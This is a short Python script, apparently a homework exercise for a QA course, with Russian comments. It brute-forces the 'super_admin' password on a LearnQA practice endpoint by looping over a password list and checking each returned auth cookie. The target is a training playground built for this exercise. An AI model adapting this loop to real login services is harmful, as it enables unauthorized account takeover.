from json import JSONDecodeError

import requests


from passwords import passwords # список паролей

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
for password in passwords:
    try:
        response = requests.post(url=url, data={"login":"super_admin","password":password})
        cook = response.cookies.get('auth_cookie') #Достаем авторизованные куки
        cookies = {'auth_cookie': cook} #ключ значение
        response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",cookies=cookies)
        if response.text != 'You are NOT authorized':
            print(f"Ура! {response.text}. Пароль:{password}")
            break
    except JSONDecodeError:
        print("error")